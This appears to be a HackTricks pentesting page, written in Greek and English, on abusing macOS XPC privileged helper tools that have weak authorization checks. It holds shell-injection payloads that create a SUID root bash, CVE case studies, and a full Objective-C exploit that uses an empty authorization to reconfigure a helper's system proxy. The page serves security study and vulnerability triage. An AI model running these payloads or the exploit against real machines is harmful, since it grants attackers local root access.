# macOS XPC Εξουσιοδότηση

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Εξουσιοδότηση

Η Apple προτείνει επίσης έναν άλλο τρόπο για να γίνει authentication εφόσον η διεργασία που συνδέεται έχει **άδειες για να καλέσει μια εκτεθειμένη XPC μέθοδο**.

Όταν μια εφαρμογή χρειάζεται να **εκτελεί ενέργειες ως προνομιούχος χρήστης**, αντί να τρέχει την εφαρμογή ως προνομιούχος χρήστη, συνήθως εγκαθιστά ως root ένα HelperTool ως XPC service που μπορεί να κληθεί από την εφαρμογή για να εκτελέσει αυτές τις ενέργειες. Ωστόσο, η εφαρμογή που καλεί την υπηρεσία πρέπει να έχει επαρκή εξουσιοδότηση.

### ShouldAcceptNewConnection πάντα YES

Ένα παράδειγμα μπορεί να βρεθεί στο [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Στο `App/AppDelegate.m` προσπαθεί να **συνδεθεί** με το **HelperTool**. Και στο `HelperTool/HelperTool.m` η συνάρτηση **`shouldAcceptNewConnection`** **δεν ελέγχει** καμία από τις απαιτήσεις που αναφέρθηκαν προηγουμένως. Θα επιστρέφει πάντα YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Για περισσότερες πληροφορίες σχετικά με το πώς να διαμορφώσετε σωστά αυτόν τον έλεγχο:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Δικαιώματα εφαρμογής

Ωστόσο, υπάρχει κάποια **authorization που συμβαίνει όταν καλείται μια μέθοδος από το HelperTool**.

Η συνάρτηση **`applicationDidFinishLaunching`** από το `App/AppDelegate.m` θα δημιουργήσει ένα κενό authorization reference μετά την εκκίνηση της εφαρμογής. Αυτό θα πρέπει να λειτουργεί πάντα.\
Στη συνέχεια, θα προσπαθήσει να **προσθέσει κάποια δικαιώματα** σε αυτό το authorization reference καλώντας `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Η συνάρτηση `setupAuthorizationRights` από το `Common/Common.m` θα αποθηκεύσει στη βάση εξουσιοδοτήσεων `/var/db/auth.db` τα δικαιώματα της εφαρμογής. Σημειώστε πώς θα προσθέσει μόνο τα δικαιώματα που δεν υπάρχουν ήδη στη βάση δεδομένων:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Η συνάρτηση `enumerateRightsUsingBlock` είναι αυτή που χρησιμοποιείται για να πάρει τα δικαιώματα των εφαρμογών, τα οποία ορίζονται στο `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Αυτό σημαίνει ότι στο τέλος αυτής της διαδικασίας, οι άδειες που δηλώνονται μέσα στο `commandInfo` θα αποθηκευτούν στο `/var/db/auth.db`. Σημειώστε πως εκεί μπορείτε να βρείτε για **κάθε μέθοδο** που θα **απαιτεί αυθεντικοποίηση**, **όνομα δικαιώματος** και το **`kCommandKeyAuthRightDefault`**. Το τελευταίο **δείχνει ποιος μπορεί να αποκτήσει αυτό το δικαίωμα**.

Υπάρχουν διαφορετικά scopes για να υποδείξουν ποιος μπορεί να έχει πρόσβαση σε ένα δικαίωμα. Μερικά από αυτά ορίζονται στο [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (μπορείτε να βρείτε [όλα αυτά εδώ](https://www.dssw.co.uk/reference/authorization-rights/)), αλλά συνοπτικά:

<table><thead><tr><th width="284.3333333333333">Όνομα</th><th width="165">Τιμή</th><th>Περιγραφή</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Οποιοσδήποτε</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Κανένας</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Ο τρέχων χρήστης πρέπει να είναι διαχειριστής (μέλος της ομάδας admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Ζητά από τον χρήστη να αυθεντικοποιηθεί.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Ζητά από τον χρήστη να αυθεντικοποιηθεί. Πρέπει να είναι διαχειριστής (μέλος της ομάδας admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Καθορίζει κανόνες</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Προσθέτει επιπλέον σχόλια για το δικαίωμα</td></tr></tbody></table>

### Επαλήθευση Δικαιωμάτων

Στο `HelperTool/HelperTool.m` η συνάρτηση **`readLicenseKeyAuthorization`** ελέγχει αν ο καλών είναι εξουσιοδοτημένος να **εκτελέσει αυτή τη μέθοδο** καλώντας τη συνάρτηση **`checkAuthorization`**. Αυτή η συνάρτηση θα ελέγξει ότι τα **authData** που στέλνονται από τη διαδικασία καλούν έχουν **σωστή μορφή** και στη συνέχεια θα ελέγξει **τι απαιτείται για να αποκτήσεις το δικαίωμα** να καλέσεις τη συγκεκριμένη μέθοδο. Αν όλα πάνε καλά, το **επιστρεφόμενο `error` θα είναι `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Σημειώστε ότι για να **ελεγχθούν οι προϋποθέσεις για να αποκτήσει το δικαίωμα** να καλέσει αυτή τη μέθοδο η συνάρτηση `authorizationRightForCommand` θα απλώς ελέγξει το προαναφερθέν αντικείμενο σχολίου **`commandInfo`**. Στη συνέχεια, θα καλέσει **`AuthorizationCopyRights`** για να ελέγξει **εάν έχει τα δικαιώματα** να καλέσει τη συνάρτηση (σημειώστε ότι τα flags επιτρέπουν αλληλεπίδραση με τον χρήστη).

Σε αυτή την περίπτωση, για να καλέσετε τη συνάρτηση `readLicenseKeyAuthorization` το `kCommandKeyAuthRightDefault` έχει οριστεί σε `@kAuthorizationRuleClassAllow`. Έτσι **ο καθένας μπορεί να την καλέσει**.

### Πληροφορίες DB

Αναφέρθηκε ότι αυτές οι πληροφορίες αποθηκεύονται στο `/var/db/auth.db`. Μπορείτε να απαριθμήσετε όλους τους αποθηκευμένους κανόνες με:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Στη συνέχεια, μπορείτε να δείτε ποιος μπορεί να έχει πρόσβαση στο δικαίωμα με:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Επιτρεπτικά δικαιώματα

Μπορείτε να βρείτε **όλες τις ρυθμίσεις δικαιωμάτων** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), αλλά οι συνδυασμοί που δεν θα απαιτούν αλληλεπίδραση χρήστη είναι:

1. **'authenticate-user': 'false'**
- Αυτό είναι το πιο άμεσο κλειδί. Αν οριστεί σε `false`, δηλώνει ότι ένας χρήστης δεν χρειάζεται να παρέχει επαλήθευση ταυτότητας για να αποκτήσει αυτό το δικαίωμα.
- Αυτό χρησιμοποιείται σε **συνδυασμό με ένα από τα 2 παρακάτω ή με την ένδειξη μιας ομάδας** στην οποία πρέπει να ανήκει ο χρήστης.
2. **'allow-root': 'true'**
- Αν ένας χρήστης λειτουργεί ως ο χρήστης root (ο οποίος έχει αυξημένα προνόμια), και αυτό το κλειδί είναι ορισμένο σε `true`, ο χρήστης root ενδέχεται να αποκτήσει αυτό το δικαίωμα χωρίς περαιτέρω επαλήθευση. Ωστόσο, συνήθως, η απόκτηση κατάστασης root απαιτεί ήδη επαλήθευση, οπότε αυτό δεν αποτελεί σενάριο «χωρίς επαλήθευση» για τους περισσότερους χρήστες.
3. **'session-owner': 'true'**
- Αν οριστεί σε `true`, ο κάτοχος της συνεδρίας (ο τρέχοντα συνδεδεμένος χρήστης) θα λαμβάνει αυτόματα αυτό το δικαίωμα. Αυτό μπορεί να παρακάμψει πρόσθετη επαλήθευση αν ο χρήστης είναι ήδη συνδεδεμένος.
4. **'shared': 'true'**
- Αυτό το κλειδί δεν χορηγεί δικαιώματα χωρίς επαλήθευση. Αντίθετα, αν οριστεί σε `true`, σημαίνει ότι μόλις το δικαίωμα έχει επαληθευτεί, μπορεί να κοινοποιείται ανάμεσα σε πολλαπλές διεργασίες χωρίς η κάθε μία να χρειάζεται να επαληθευτεί ξανά. Αλλά η αρχική χορήγηση του δικαιώματος θα απαιτεί ακόμη επαλήθευση εκτός αν συνδυαστεί με άλλα κλειδιά όπως `'authenticate-user': 'false'`.

Μπορείτε να [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) για να αποκτήσετε τα ενδιαφέροντα δικαιώματα:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Μελέτες Περίπτωσης Παράκαμψης Εξουσιοδότησης

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Η υπηρεσία Mach με προνόμια `com.acustica.HelperTool` δέχεται κάθε σύνδεση και η ρουτίνα `checkAuthorization:` καλεί `AuthorizationCopyRights(NULL, …)`, έτσι οποιοδήποτε 32‑byte blob περνάει. Η `executeCommand:authorization:withReply:` στη συνέχεια τροφοδοτεί στον `NSTask` ως root strings διαχωρισμένα με κόμμα που ελέγχονται από τον επιτιθέμενο, δημιουργώντας payloads όπως:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
μπορεί εύκολα να δημιουργήσει ένα SUID root shell. Details in [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Ο listener πάντα επιστρέφει YES και το ίδιο μοτίβο NULL `AuthorizationCopyRights` εμφανίζεται στο `checkAuthorization:`. Η μέθοδος `exchangeAppWithReply:` συνενώνει την εισροή του επιτιθέμενου σε ένα `system()` string δύο φορές, οπότε η εισαγωγή shell metacharacters στο `appPath` (π.χ. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) αποδίδει εκτέλεση κώδικα ως root μέσω της Mach υπηρεσίας `com.plugin-alliance.pa-installationhelper`. More info [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Η εκτέλεση ενός audit γράφει το `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, εκθέτει την Mach υπηρεσία `com.jamf.complianceeditor.helper` και εξάγει το `-executeScriptAt:arguments:then:` χωρίς να επαληθεύει το `AuthorizationExternalForm` του καλούντος ή το code signature. Ένας απλός exploit `AuthorizationCreate`s ένα κενό reference, συνδέεται με `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` και καλεί τη μέθοδο για να εκτελέσει αυθαίρετα binaries ως root. Full reversing notes (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 and 7.4.0–7.4.2 αποδεχόταν crafted XPC messages που έφταναν σε έναν privileged helper χωρίς authorization gates. Εφόσον ο helper εμπιστευόταν το δικό του privileged `AuthorizationRef`, οποιοσδήποτε τοπικός χρήστης μπορούσε να τον αναγκάσει να εκτελέσει αυθαίρετες αλλαγές ρυθμίσεων ή εντολές ως root. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Rapid triage tips

- When an app ships both a GUI and helper, diff their code requirements and check whether `shouldAcceptNewConnection` locks the listener with `-setCodeSigningRequirement:` (or validates `SecCodeCopySigningInformation`). Missing checks usually yield CWE-863 scenarios like the Jamf case. A quick peek looks like:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Συγκρίνετε τι *νομίζει* ότι εξουσιοδοτεί ο helper με ό,τι παρέχει ο client. Κατά την αντίστροφη ανάλυση, κάντε break στο `AuthorizationCopyRights` και επιβεβαιώστε ότι το `AuthorizationRef` προέρχεται από `AuthorizationCreateFromExternalForm` (παρασχέθηκε από τον client) αντί του προνομιακού περιβάλλοντος του helper — αλλιώς πιθανότατα βρήκατε ένα pattern CWE-863 παρόμοιο με τις παραπάνω περιπτώσεις.

## Αντίστροφη ανάλυση Authorization

### Έλεγχος αν χρησιμοποιείται το EvenBetterAuthorization

If you find the function: **`[HelperTool checkAuthorization:command:]`** it's probably the the process is using the previously mentioned schema for authorization:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Αν αυτή η συνάρτηση καλεί συναρτήσεις όπως `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, τότε χρησιμοποιεί [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Ελέγξτε το **`/var/db/auth.db`** για να δείτε αν είναι δυνατό να αποκτήσετε δικαιώματα για την εκτέλεση κάποιας προνομιακής ενέργειας χωρίς αλληλεπίδραση χρήστη.

### Protocol Communication

Στη συνέχεια, πρέπει να βρείτε το σχήμα του πρωτοκόλλου ώστε να μπορέσετε να δημιουργήσετε επικοινωνία με την XPC service.

The function **`shouldAcceptNewConnection`** indicates the protocol being exported:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Σε αυτή την περίπτωση, είναι το ίδιο με το EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Γνωρίζοντας, το όνομα του χρησιμοποιούμενου πρωτοκόλλου, είναι δυνατό να **dump its header definition** με:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Τέλος, χρειάζεται μόνο να γνωρίζουμε το **όνομα της εκτεθειμένης Mach Service** για να εγκαθιδρύσουμε επικοινωνία μαζί της. Υπάρχουν διάφοροι τρόποι για να το βρείτε:

- Στο **`[HelperTool init]`** όπου μπορείτε να δείτε τη Mach Service να χρησιμοποιείται:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Στο launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Παράδειγμα Exploit

Σε αυτό το παράδειγμα δημιουργούνται:

- Ο ορισμός του protocol με τις functions
- Ένα κενό auth για να χρησιμοποιηθεί για να ζητηθεί πρόσβαση
- Μια σύνδεση στην XPC υπηρεσία
- Μια κλήση στη function εάν η σύνδεση ήταν επιτυχής
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Άλλοι βοηθητικοί XPC που καταχρώνται για αναβάθμιση προνομίων

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Αναφορές

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
